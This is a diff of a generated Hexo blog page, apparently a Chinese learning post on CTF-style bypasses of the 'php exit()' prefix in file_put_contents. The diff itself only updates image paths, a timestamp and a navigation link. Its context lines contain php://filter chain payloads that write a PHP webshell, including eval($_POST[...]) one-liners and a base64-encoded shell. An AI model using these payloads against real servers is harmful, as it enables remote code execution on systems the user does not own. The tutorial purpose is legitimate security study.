@@ -33,14 +33,14 @@
 <meta property="og:site_name" content="kivvs">
 <meta property="og:description" content="经常出现的三种情形 123file_put_contents($filename,&quot;&lt;?php exit();&quot;.$content);file_put_contents($content,&quot;&lt;?php exit();&quot;.$content);file_put_contents($filename,$content . &quot;\nxxxxxx&amp;">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="c:\Users\Lenovo\hexo-blog\source\images\3795925-20260505232316870-1145760888.png">
-<meta property="og:image" content="c:\Users\Lenovo\hexo-blog\source\images\3795925-20260505232446777-1997517219.png">
+<meta property="og:image" content="http://example.com/images/3795925-20260505232316870-1145760888.png">
+<meta property="og:image" content="http://example.com/images/3795925-20260505232446777-1997517219.png">
 <meta property="article:published_time" content="2026-08-13T11:26:31.000Z">
-<meta property="article:modified_time" content="2026-08-13T13:21:22.546Z">
+<meta property="article:modified_time" content="2026-08-13T13:25:44.896Z">
 <meta property="article:author" content="kivvs">
 <meta property="article:tag" content="web学习">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="c:\Users\Lenovo\hexo-blog\source\images\3795925-20260505232316870-1145760888.png">
+<meta name="twitter:image" content="http://example.com/images/3795925-20260505232316870-1145760888.png">
   
   
   
@@ -444,7 +444,7 @@
 <h3 id="最终过滤选择器组合拳"><a href="#最终过滤选择器组合拳" class="headerlink" title="最终过滤选择器组合拳"></a>最终过滤选择器组合拳</h3><p>如果题目的环境是php7的话，那么我们又该如何？这里受一个题目的启发，也可以使用过滤器进行嵌套来做；组合拳；这里三个过滤器叠加之后先进行压缩，然后转小写，最后解压，会导致部分死亡代码错误；则可以写入shell；</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">$filename=php://filter/zlib.deflate|string.tolower|zlib.inflate|/resource=shell.php<br>$content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0d@eval($_POST[cmd]);?&gt;/resource=shell.php<br></code></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\Lenovo\hexo-blog\source\images\3795925-20260505232316870-1145760888.png" srcset="/img/loading.gif" lazyload alt="3795925-20260505232316870-1145760888"></p>
+<p><img src="/images/3795925-20260505232316870-1145760888.png" srcset="/img/loading.gif" lazyload alt="3795925-20260505232316870-1145760888"></p>
 <p>注：这里有过尝试但是无法正常上传一句话木马，还有待改进，此方法暂时行不通。同时要用BP上传，否则上传文件名是部分URL编码，用BP上传后能够正常上传文件且文件名正常，但是内容总是乱码，具体原因不得而知。</p>
 <h2 id="Bypass-不同变量"><a href="#Bypass-不同变量" class="headerlink" title="Bypass-不同变量"></a>Bypass-不同变量</h2><p>前面一直都是在相同变量的情况下进行绕过，现在我们再来讨论一下不同变量的是如何绕过的，实际上与前面的原理差不太多</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[a];<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;&lt;?php exit();&#x27;</span>.<span class="hljs-variable">$a</span>)<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
@@ -453,7 +453,7 @@
 <h3 id="convert-base64"><a href="#convert-base64" class="headerlink" title="convert.base64"></a>convert.base64</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">a=php://filter/write=convert.base64-decode/resource=PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+.php<br><br>//注意payload中的字符&#x27;+&#x27;在浏览器中需要转换为%2B<br><br># &lt;?php @eval($_POST[Qftm])?&gt;<br></code></pre></td></tr></table></figure>
 
 <p>其实这样构造是不可以的，因为构造的payload里面包含’&#x3D;’符号，而base64解码的时候如果字符’&#x3D;’后面包含有其他字符则会报错。<br>	从下图我们也可以看出来</p>
-<p><img src="C:\Users\Lenovo\hexo-blog\source\images\3795925-20260505232446777-1997517219.png" srcset="/img/loading.gif" lazyload alt="3795925-20260505232446777-1997517219"></p>
+<p><img src="/images/3795925-20260505232446777-1997517219.png" srcset="/img/loading.gif" lazyload alt="3795925-20260505232446777-1997517219"></p>
 <p>那么能不能尝试把字符等号去掉，分析payload可以把字符串write&#x3D;去掉减少一个等号，但是字符串resource&#x3D;里面的等号不能去掉，也就导致该payload构造失败。 这里到后面 讲述convert.iconv.*的utf8-utf7的时候会讲述怎么绕过base64解码时字符’&#x3D;’的限制<br>	不过这里还有一种去掉等号之直接对内容进行变性另类base64的方法</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/&lt;?|string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+/../shell.php</span><br>(<span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[Qftm])<span class="hljs-meta">?&gt;</span>)<br> <span class="hljs-keyword">string</span>.strip_tags  <br>a=php:<span class="hljs-comment">//filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+.php</span><br>(<span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[Qftm])<span class="hljs-meta">?&gt;</span>)<br><br><span class="hljs-comment"># 结果</span><br><span class="hljs-meta">&lt;?php</span>  <span class="hljs-keyword">exit</span>();php:<span class="hljs-comment">//filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+.php</span><br></code></pre></td></tr></table></figure>
 
@@ -553,8 +553,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2026/08/13/test/" title="file_put_content之死亡杂糅">
-                        <span class="hidden-mobile">file_put_content之死亡杂糅</span>
+                      <a href="/2026/08/13/hello-world/" title="Hello World">
+                        <span class="hidden-mobile">Hello World</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
